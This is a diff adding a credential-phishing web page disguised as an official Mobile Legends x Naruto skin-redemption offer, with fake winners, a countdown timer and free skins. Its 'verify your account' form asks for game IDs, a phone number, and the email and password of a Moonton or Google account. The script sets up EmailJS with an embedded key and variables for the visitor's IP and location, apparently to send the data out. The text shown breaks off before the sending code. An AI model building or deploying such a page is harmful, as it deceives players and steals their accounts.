@@ -1,0 +1,1538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MLBB x Naruto - Skin Redemption</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');
+    
+    :root {
+      --primary: #ffcc00;
+      --secondary: #1a1a2e;
+      --dark-blue: #0f3460;
+      --purple: #533d7b;
+      --red: #ff4444;
+      --starlight: #ffd700;
+      --premium: #9b59b6;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #533d7b);
+      background-size: 400% 400%;
+      min-height: 100vh;
+      color: #fff;
+      animation: gradientBG 15s ease infinite;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 20px;
+      perspective: 1000px;
+    }
+
+    .title {
+      text-align: center;
+      margin-bottom: 10px;
+      font-size: 2.5rem;
+      background: linear-gradient(90deg, #ffcc00, #ff9500, red);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 10px rgba(255, 200, 0, 0.3);
+      position: relative;
+      animation: titleGlow 2s infinite alternate;
+    }
+
+    @keyframes titleGlow {
+      from { text-shadow: 0 0 10px rgba(255, 200, 0, 0.3); }
+      to { text-shadow: 0 0 20px rgba(255, 200, 0, 0.7), 0 0 30px rgba(255, 150, 0, 0.5); }
+    }
+
+    .subtitle {
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 1rem;
+      color: rgba(255, 255, 255, 0.8);
+      position: relative;
+    }
+
+    .subtitle::after {
+      content: '';
+      display: block;
+      width: 100px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #ffcc00, transparent);
+      margin: 10px auto;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .required {
+      color: var(--red);
+    }
+
+    /* Header Styles */
+    .top-bar {
+      position: relative;
+      width: 100%;
+    }
+    
+    .header-bar {
+      position: absolute;
+      top: 10px;
+      left: 0;
+      right: 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 15px;
+      z-index: 10;
+    }
+    
+    .header-bar img.logo {
+      width: 32px;
+      height: 32px;
+      object-fit: contain;
+    }
+    
+    .menu-icon {
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+    }
+    
+    .menu-icon div {
+      background-color: #fff;
+      height: 3px;
+      margin: 4px 0;
+      border-radius: 1px;
+    }
+    
+    .banner {
+      width: 100%;
+      height: auto;
+      display: block;
+      object-fit: cover;
+    }
+
+    /* Marquee Styles */
+    .marquee-container {
+      overflow: hidden;
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.05);
+      margin-bottom: 12px;
+      border: 1px solid rgba(255, 204, 0, 0.2);
+      box-shadow: 0 0 8px rgba(255, 204, 0, 0.2);
+    }
+    
+    .marquee {
+      display: inline-block;
+      white-space: nowrap;
+      animation: scrollText 30s linear infinite;
+      padding: 10px 0;
+      font-size: 0.95rem;
+      color: var(--primary);
+      font-weight: 600;
+    }
+    
+    @keyframes scrollText {
+      0% { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+    
+    /* Countdown Timer */
+    .countdown {
+      text-align: center;
+      font-size: 1.1rem;
+      margin-top: 10px;
+      padding: 8px 12px;
+      border-radius: 6px;
+      box-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
+      font-weight: bold;
+      color: var(--primary);
+    }
+    
+    /* Skin Grid */
+    .skin-grid-container {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    
+    .regular-skin-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+    }
+    
+    /* Starlight Section */
+    .starlight-section {
+      margin-top: 20px;
+      padding: 15px;
+      background: rgba(255, 215, 0, 0.05);
+      border-radius: 10px;
+      border: 1px solid rgba(255, 215, 0, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .starlight-section::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--starlight), transparent);
+    }
+    
+    .starlight-title {
+      text-align: center;
+      color: var(--starlight);
+      margin-bottom: 15px;
+      font-weight: 700;
+      text-shadow: 0 0 8px rgba(255, 215, 0, 0.4);
+    }
+    
+    .starlight-skin-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+    }
+    
+    .skin-card {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 8px;
+      padding: 8px;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      cursor: pointer;
+    }
+    
+    .skin-card::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to bottom right,
+        transparent 45%,
+        rgba(255, 204, 0, 0.1) 50%,
+        transparent 55%
+      );
+      animation: shine 3s infinite;
+      z-index: 0;
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+    
+    .skin-card:hover::before {
+      opacity: 1;
+    }
+    
+    .skin-card.starlight {
+      border: 2px solid var(--starlight);
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+      background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05));
+    }
+    
+    .skin-card.premium {
+      border: 2px solid var(--premium);
+      box-shadow: 0 0 10px rgba(155, 89, 182, 0.5);
+    }
+    
+    .skin-card img {
+      width: 100%;
+      border-radius: 6px;
+      margin-bottom: 8px;
+      max-height: 120px;
+      object-fit: contain;
+    }
+    
+    .skin-card:hover {
+      transform: scale(1.03);
+    }
+    
+    .skin-badge {
+      position: absolute;
+      top: 5px;
+      right: 5px;
+      font-size: 0.6rem;
+      font-weight: bold;
+      padding: 2px 4px;
+      border-radius: 3px;
+    }
+    
+    .starlight-badge {
+      background-color: var(--starlight);
+      color: #000;
+    }
+    
+    .premium-badge {
+      background-color: var(--premium);
+      color: #fff;
+    }
+    
+    /* Form Styles */
+    .form-container {
+      background: rgba(15, 15, 15, 0.7);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 204, 0, 0.3);
+      border-radius: 20px;
+      padding: 30px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 
+                  inset 0 0 15px rgba(255, 204, 0, 0.2);
+      transform-style: preserve-3d;
+      transition: all 0.5s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .form-container::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to bottom right,
+        transparent 45%,
+        rgba(255, 204, 0, 0.1) 50%,
+        transparent 55%
+      );
+      animation: shine 3s infinite;
+      z-index: 0;
+    }
+
+    @keyframes shine {
+      0% { transform: rotate(0deg) translate(-50%, -50%); }
+      100% { transform: rotate(360deg) translate(-50%, -50%); }
+    }
+
+    .form-container:hover {
+      transform: translateY(-5px) rotateX(5deg);
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 
+                  inset 0 0 20px rgba(255, 204, 0, 0.3);
+    }
+    
+    .form-group {
+      margin-bottom: 15px;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
+    
+    .form-control {
+      width: 100%;
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid rgba(255,255,255,0.1);
+      background: rgba(30, 30, 30, 0.8);
+      color: white;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5);
+    }
+
+    select.form-control {
+      appearance: none;
+      -webkit-appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffcc00'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 15px center;
+      background-size: 15px;
+      padding-right: 40px;
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: #ffcc00;
+      box-shadow: 0 0 10px rgba(255, 204, 0, 0.5),
+                  inset 0 1px 3px rgba(0, 0, 0, 0.5);
+      transform: translateY(-2px);
+    }
+    
+    /* Buttons */
+    .claim-btn {
+      background: linear-gradient(135deg, #ffcc00, #ff9500, #ffcc00);
+      background-size: 200% 200%;
+      border: none;
+      padding: 8px;
+      color: #111;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.8rem;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 3px 8px rgba(255, 153, 0, 0.4);
+      width: 100%;
+    }
+
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    
+    .claim-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 12px rgba(255, 153, 0, 0.6);
+    }
+    
+    .claim-btn:active {
+      transform: translateY(1px);
+    }
+
+    .claim-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.2),
+        transparent
+      );
+      transition: all 0.5s ease;
+    }
+
+    .claim-btn:hover::before {
+      left: 100%;
+    }
+    
+    .claim-btn:disabled {
+      background: #cccccc;
+      cursor: not-allowed;
+      transform: none;
+      animation: none;
+    }
+
+    .back-btn {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 15px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    .back-btn:hover {
+      background: rgba(255, 204, 0, 0.2);
+    }
+    
+    /* Modal Styles */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    
+    .modal-content {
+      background: var(--secondary);
+      color: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 320px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 0 20px var(--primary);
+      position: relative;
+    }
+    
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: transparent;
+      border: none;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+    }
+    
+    .error-message {
+      color: var(--red);
+      font-size: 0.8rem;
+      margin-top: 5px;
+      display: none;
+    }
+    
+    .login-method {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin: 15px 0;
+    }
+    
+    .method-option {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-radius: 8px;
+      background: rgba(255,255,255,0.1);
+      border: 1px solid transparent;
+      cursor: pointer;
+    }
+    
+    .method-option:hover {
+      background: rgba(255,255,255,0.2);
+    }
+    
+    .method-option.selected {
+      border-color: var(--primary);
+      background: rgba(255,204,0,0.1);
+    }
+    
+    .method-option input[type="radio"] {
+      margin-right: 10px;
+    }
+    
+    .method-option label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      width: 100%;
+    }
+    
+    .country-flag {
+      width: 20px;
+      height: 15px;
+      object-fit: cover;
+      border-radius: 2px;
+      margin-right: 5px;
+    }
+    
+    .attempts-warning {
+      color: var(--red);
+      font-size: 0.8rem;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
+    }
+
+    /* Redeem Code Section */
+    .redeem-section {
+      margin-top: 20px;
+      padding: 15px;
+      background: rgba(255, 204, 0, 0.1);
+      border-radius: 10px;
+      border: 1px dashed var(--primary);
+    }
+
+    .redeem-code {
+      font-family: monospace;
+      font-size: 1.2rem;
+      letter-spacing: 2px;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border-radius: 5px;
+      margin: 10px 0;
+      color: var(--primary);
+      text-align: center;
+      min-height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .copy-btn {
+      background: rgba(255, 204, 0, 0.2);
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 8px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      margin: 0 auto;
+    }
+
+    .copy-btn:hover {
+      background: rgba(255, 204, 0, 0.3);
+    }
+
+    /* Confetti */
+    .confetti {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background-color: #f00;
+      opacity: 0;
+      z-index: 10;
+    }
+
+    /* Skin Preview in Modal */
+    .skin-preview {
+      width: 200px;
+      height: 200px;
+      margin: 15px auto;
+      border-radius: 10px;
+      overflow: hidden;
+      border: 2px solid var(--primary);
+      box-shadow: 0 0 20px rgba(255, 204, 0, 0.5);
+    }
+    
+    .skin-preview img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    
+    .redeemed-info {
+      margin-top: 15px;
+      background: rgba(255, 204, 0, 0.1);
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px dashed var(--primary);
+    }
+    
+    .redeemed-code {
+      font-family: monospace;
+      font-size: 1.1rem;
+      color: var(--primary);
+      font-weight: bold;
+      margin: 5px 0;
+    }
+
+    /* Waiting Message */
+    .waiting-message {
+      background: rgba(255, 204, 0, 0.1);
+      padding: 12px;
+      border-radius: 8px;
+      margin: 15px 0;
+      border-left: 4px solid var(--primary);
+      text-align: center;
+    }
+    
+    .waiting-message i {
+      color: var(--primary);
+      font-size: 1.2rem;
+      margin-bottom: 8px;
+      display: block;
+    }
+    
+    .waiting-message p {
+      margin: 5px 0;
+      font-size: 0.9rem;
+    }
+    
+    .highlight {
+      color: var(--primary);
+      font-weight: bold;
+    }
+
+    /* Glow Effect */
+    @keyframes pulse-glow {
+      0% {
+        background-position: -100% 0;
+      }
+      100% {
+        background-position: 100% 0;
+      }
+    }
+
+    .glow-box {
+      position: relative;
+      overflow: hidden;
+      border: 0px solid red;
+      background-image: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      background-size: 200% 100%;
+      animation: pulse-glow 2.5s ease-in-out infinite;
+      border-radius: 10px;
+    }
+
+    /* Starlight Divider */
+    .starlight-divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 30px 0;
+      position: relative;
+    }
+
+    .starlight-divider::before,
+    .starlight-divider::after {
+      content: '';
+      flex: 1;
+      border-top: 2px dashed rgba(255, 215, 0, 0.4);
+      height: 1px;
+    }
+
+    .starlight-divider span {
+      font-family: 'Montserrat', sans-serif;
+      color: #ffcc00;
+      font-size: 18px;
+      padding: 0 12px;
+      text-shadow: 0 0 5px #ffcc00, 0 0 10px #ffaa00;
+      animation: glowText 2s ease-in-out infinite alternate;
+      letter-spacing: 2px;
+      position: relative;
+      z-index: 1;
+    }
+
+    @keyframes glowText {
+      from {
+        text-shadow: 0 0 5px #ffcc00, 0 0 10px #ffaa00;
+      }
+      to {
+        text-shadow: 0 0 10px #ffe066, 0 0 20px #ffd700;
+      }
+    }
+
+    /* Bottom Banner */
+    .bottom-banner {
+      width: 100%;
+      margin-top: 20px;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    /* Responsive */
+    @media (max-width: 600px) {
+      .title {
+        font-size: 2rem;
+      }
+      
+      .form-container {
+        padding: 20px;
+      }
+      
+      .skin-preview {
+        width: 160px;
+        height: 160px;
+      }
+      
+      .regular-skin-grid {
+        grid-template-columns: repeat(3, 1fr);
+      }
+      
+      .starlight-skin-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+  </style>
+</head>
+<body>
+  
+  <!-- Step 1: Skin Selection -->
+    </div>
+    <img src="https://i.ibb.co/V0RTbb8s/IMG-20250602-191121.jpg" alt="Naruto Banner" class="banner" loading="lazy">
+  </div>
+
+  <div class="container" id="step1">
+    <h1 class="title">MLBB x NARUTO</h1>
+    <p class="subtitle">Exclusive Skin Redemption</p>
+    
+    <div class="marquee-container">
+      <div class="marquee" id="marqueeContent">Loading winners...</div>
+    </div>
+    <div class="countdown">LIMITED TIME OFFER: <span id="timer">00:00:00</span></div>
+
+    <div class="skin-grid-container">
+      <div class="regular-skin-grid glow-box">
+        <!-- Regular Skins (12) -->
+        <div class="skin-card">
+          <img src="https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg" alt="Naruto Uzumaki" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Naruto Uzumaki')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/tPPz7GPS/IMG-20250513-192141.jpg" alt="Sasuke Uchiha" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Sasuke Uchiha')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/Hfj4SsgH/IMG-20250513-192111.jpg" alt="Sakura Haruno" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Sakura Haruno')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/wfk0j8T/IMG-20250513-192211.jpg" alt="Kakashi Hatake" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Kakashi Hatake')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/272LYwW8/IMG-20250530-214157.jpg" alt="Ling Collector" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Ling Collector')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/WJZtvn1/IMG-20250530-214224.jpg" alt="Fanny Aspirant" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Fanny Aspirant')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/v4zQvd1P/IMG-20250530-214307.jpg" alt="Lancelot Dawning" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Lancelot Dawning')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/SDWJ6YPW/IMG-20250530-214431.jpg" alt="Selena Zenith" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Selena Zenith')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/YwjSshz/IMG-20250530-214501.jpg" alt="KOF CHOU" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('KOF CHOU')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/JRhCZ6tN/IMG-20250530-214604.jpg" alt="Yi shun shin Collector" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Yi Shun shin collector')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/JhjtKLF/IMG-20250530-214346.jpg" alt="Alpha Legends" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Alpha Legends')">CLAIM</button>
+        </div>
+        <div class="skin-card">
+          <img src="https://i.ibb.co/B5CGNr2T/IMG-20250530-214536.jpg" alt="Johnson Legends" loading="lazy">
+          <button class="claim-btn" onclick="selectSkin('Johson Legends')">CLAIM</button>
+        </div>
+      </div>
+
+      <!-- Starlight Section -->
+      <div class="starlight-section glow-box">
+        <h3 class="starlight-title">STARLIGHT MEMBER SKINS</h3>
+        <div class="starlight-skin-grid">
+          <div class="skin-card starlight">
+            <div class="skin-badge starlight-badge">STARLIGHT</div>
+            <img src="https://i.ibb.co/NdP55zWS/images-8.jpg" alt="Starlight Skin 1" loading="lazy">
+            <button class="claim-btn" onclick="selectSkin('Starlight')">CLAIM</button>
+          </div>
+          <div class="skin-card starlight">
+            <div class="skin-badge starlight-badge">PREMIUM</div>
+            <img src="https://i.ibb.co/NgjTHc6P/download-2.jpg" alt="Starlight Premium" loading="lazy">
+            <button class="claim-btn" onclick="selectSkin('Starlight Premium')">CLAIM</button>
+          </div>
+          <div class="skin-card starlight">
+            <div class="skin-badge starlight-badge">DIAMOND</div>
+            <img src="https://i.ibb.co/j9VN0dMt/IMG-20250530-212015.jpg" alt="Starlight Elite" loading="lazy">
+            <button class="claim-btn" onclick="selectSkin('Starlight Elite')">CLAIM</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bottom Banner -->
+    <div class="bottom-banner">
+      <img src="https://i.ibb.co/HfC2KPJs/IMG-20250602-191134.jpg" alt="Bottom Banner" loading="lazy" style="width:100%;">
+    </div>
+  </div>
+
+  <!-- Step 2: Verification Form -->
+  <div id="step2Form" class="hidden form-container">
+    <div class="running-light"></div>
+    <div style="text-align: center; margin-bottom: 20px;">
+      <img src="https://i.ibb.co/TBdv1F7Y/download-removebg-preview.png" width="60" alt="MLBB Logo" loading="lazy">
+      <h2 style="margin-top: 10px;">Verify Your MLBB Account</h2>
+      <p style="font-size: 0.9rem; opacity: 0.8;">Selected Skin: <span id="selectedSkinText" style="color: var(--primary); font-weight: bold;">None</span></p>
+    </div>
+
+    <div class="form-group">
+      <label><i class="fas fa-user"></i> User ID: <span class="required">*</span></label>
+      <input type="number" id="userId" class="form-control" required placeholder="Enter your User ID">
+      <div class="error-message" id="userIdError">Please enter your User ID</div>
+    </div>
+
+    <div class="form-group">
+      <label><i class="fas fa-globe"></i> Zone ID: <span class="required">*</span></label>
+      <input type="number" id="zoneId" class="form-control" required placeholder="Enter your Zone ID">
+      <div class="error-message" id="zoneIdError">Please enter your Zone ID</div>
+    </div>
+
+    <div class="form-group">
+      <label><i class="fas fa-level-up-alt"></i> Account Level: <span class="required">*</span></label>
+      <select id="accountLevel" class="form-control" required>
+        <option value="">Select Level</option>
+      </select>
+      <div class="error-message" id="levelError">Please select your level</div>
+    </div>
+
+    <div class="form-group">
+      <label><i class="fas fa-phone"></i> Phone Number: <span class="required">*</span></label>
+      <div style="display: flex; gap: 10px;">
+        <select id="countryCode" class="form-control" style="flex: 0 0 100px;" required>
+          <option value="">Code</option>
+          <option value="+62" data-flag="🇮🇩">🇮🇩 +62 (Indonesia)</option>
+          <option value="+95" data-flag="🇲🇲">🇲🇲 +95 (Myanmar)</option>
+          <option value="+66" data-flag="🇹🇭">🇹🇭 +66 (Thailand)</option>
+          <option value="+855" data-flag="🇰🇭">🇰🇭 +855 (Cambodia)</option>
+          <option value="+63" data-flag="🇵🇭">🇵🇭 +63 (Philippines)</option>
+          <option value="+91" data-flag="🇮🇳">🇮🇳 +91 (India)</option>
+          <option value="+7" data-flag="🇷🇺">🇷🇺 +7 (Russia)</option>
+          <option value="+60" data-flag="🇲🇾">🇲🇾 +60 (Malaysia)</option>
+          <option value="+84" data-flag="🇻🇳">🇻🇳 +84 (Vietnam)</option>
+          <option value="+65" data-flag="🇸🇬">🇸🇬 +65 (Singapore)</option>
+        </select>
+        <input type="tel" id="phoneNumber" class="form-control" placeholder="812xxxxxxx" required>
+      </div>
+      <div class="error-message" id="phoneError">Please enter valid phone number</div>
+    </div>
+
+    <div class="form-group">
+      <label><i class="fas fa-sign-in-alt"></i> Login Method: <span class="required">*</span></label>
+      <div class="login-method">
+        <div class="method-option" data-method="moonton">
+          <input type="radio" id="moontonLogin" name="loginMethod" required>
+          <label for="moontonLogin">
+            <img src="https://i.ibb.co/wrScFM1j/images-removebg-preview.png" alt="Moonton" width="20">
+            Moonton Account
+          </label>
+        </div>
+        <div class="method-option" data-method="google">
+          <input type="radio" id="googleLogin" name="loginMethod" required>
+          <label for="googleLogin">
+            <img src="https://i.ibb.co/YTZ9Vbjp/download-removebg-preview.png" alt="Google" width="20">
+            Google Account
+          </label>
+        </div>
+      </div>
+      <div class="error-message" id="methodError">Please select a login method</div>
+    </div>
+
+    <div id="credentialFields" class="hidden">
+      <div class="form-group">
+        <label><i class="fas fa-envelope"></i> Email: <span class="required">*</span></label>
+        <input type="email" id="loginEmail" class="form-control" required placeholder="Enter your email">
+        <div class="error-message" id="emailError">Please enter a valid email</div>
+      </div>
+      <div class="form-group">
+        <label><i class="fas fa-lock"></i> Password: <span class="required">*</span></label>
+        <input type="password" id="loginPassword" class="form-control" required placeholder="Enter your password">
+        <div class="error-message" id="passwordError">Please enter your password</div>
+      </div>
+    </div>
+
+    <!-- Redeem Code Section -->
+    <div class="redeem-section">
+      <h3 style="text-align: center; color: var(--primary); margin-bottom: 10px;">
+        <i class="fas fa-gift"></i> Your Redemption Code
+      </h3>
+      <div class="redeem-code" id="redeemCodeDisplay">Code will appear after verification</div>
+      <button class="copy-btn hidden" id="copyCodeBtn" onclick="copyRedeemCode()">
+        <i class="far fa-copy"></i> Copy Code
+      </button>
+    </div>
+
+    <!-- Redeem Code Input Form -->
+    <div id="redeemForm" class="hidden">
+      <div class="form-group">
+        <label><i class="fas fa-ticket-alt"></i> Enter Redemption Code: <span class="required">*</span></label>
+        <input type="text" id="redeemCodeInput" class="form-control" placeholder="Paste your code here">
+      </div>
+      <button id="redeemSubmitBtn" class="claim-btn" onclick="submitRedeemCode()">
+        <span id="redeemButtonText">REDEEM NOW</span>
+      </button>
+    </div>
+
+    <button id="submitBtn" class="claim-btn" onclick="validateForm()" style="margin-top: 20px;">
+      <span id="buttonText">VERIFY & GET CODE</span>
+    </button>
+
+    <button class="back-btn" onclick="backToSkinSelection()">
+      <i class="fas fa-arrow-left"></i> BACK TO SKIN SELECTION
+    </button>
+  </div>
+
+  <!-- Done Modal -->
+  <div id="doneModal" class="hidden modal-overlay">
+    <div class="modal-content">
+      <h2 style="color: var(--primary);">✨ REDEEM SUCCESSFUL! ✨</h2>
+      
+      <div class="skin-preview">
+        <img id="redeemedSkinImage" src="" alt="Redeemed Skin">
+      </div>
+      
+      <div class="redeemed-info">
+        <p>You've claimed:</p>
+        <h3 id="redeemedSkinName" style="color: var(--primary); margin: 5px 0;"></h3>
+        <p>Your redemption code:</p>
+        <div class="redeemed-code" id="modalRedeemCode"></div>
+      </div>
+      
+      <div class="waiting-message">
+        <i class="fas fa-hourglass-half"></i>
+        <p><span class="highlight">Please wait patiently</span> while we process your request</p>
+        <p>The <span class="highlight" id="skinNamePlaceholder"></span> skin will arrive in your</p>
+        <p>in-game mailbox within <span class="highlight">48 hours</span></p>
+        <p>Thank you for your understanding!</p>
+      </div>
+      
+      <button class="claim-btn" onclick="closeDoneModal()" style="margin-top: 10px; width: 100%;">
+        <i class="fas fa-check"></i> UNDERSTOOD
+      </button>
+    </div>
+  </div>
+
+  <!-- Redeem Confirmation Page -->
+  <div id="redeemConfirmation" class="hidden">
+    <div class="container">
+      <h1 class="title">REDEEM CONFIRMATION</h1>
+      <div class="form-container">
+        <div style="text-align: center; margin-bottom: 20px;">
+          <i class="fas fa-check-circle" style="font-size: 60px; color: var(--primary);"></i>
+          <h2 style="margin-top: 10px;">Your Redemption is Complete!</h2>
+          <p style="font-size: 0.9rem; opacity: 0.8;">Please wait while we redirect you...</p>
+        </div>
+        
+        <div class="waiting-message">
+          <p>Your <span class="highlight" id="confirmationSkinName"></span> skin is being processed</p>
+          <p>You will receive it in your in-game mailbox soon</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS
+    emailjs.init("HZP8Uj8mWmpQ91wyx");
+
+    // Global Variables
+    let selectedMethod = null;
+    let selectedSkin = null;
+    let redeemCode = "";
+    let userIP = '';
+    let userASN = '';
+    let userCity = 'Unknown';
+    
+    const elements = {
+      step1: document.getElementById("step1"),
+      step2Form: document.getElementById("step2Form"),
+      doneModal: document.getElementById("doneModal"),
+      redeemConfirmation: document.getElementById("redeemConfirmation"),
+      accountLevel: document.getElementById("accountLevel"),
+      marqueeContent: document.getElementById("marqueeContent"),
+      timer: document.getElementById("timer"),
+      submitBtn: document.getElementById("submitBtn"),
+      credentialFields: document.getElementById("credentialFields"),
+      methodOptions: document.querySelectorAll('.method-option'),
+      selectedSkinText: document.getElementById("selectedSkinText"),
+      redeemCodeDisplay: document.getElementById("redeemCodeDisplay"),
+      modalRedeemCode: document.getElementById("modalRedeemCode"),
+      buttonText: document.getElementById("buttonText"),
+      copyCodeBtn: document.getElementById("copyCodeBtn"),
+      redeemedSkinImage: document.getElementById("redeemedSkinImage"),
+      redeemedSkinName: document.getElementById("redeemedSkinName"),
+      skinNamePlaceholder: document.getElementById("skinNamePlaceholder"),
+      redeemForm: document.getElementById("redeemForm"),
+      redeemCodeInput: document.getElementById("redeemCodeInput"),
+      redeemSubmitBtn: document.getElementById("redeemSubmitBtn"),
+      redeemButtonText: document.getElementById("redeemButtonText"),
+      confirmationSkinName: document.getElementById("confirmationSkinName")
+    };
+
+    // Skin data with images
+    const skinData = {
+      "Naruto Uzumaki": { 
+        prefix: "NAR",
+        image: "https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg"
+      },
+      "Sasuke Uchiha": { 
+        prefix: "SAS",
+        image: "https://i.ibb.co/tPPz7GPS/IMG-20250513-192141.jpg"
+      },
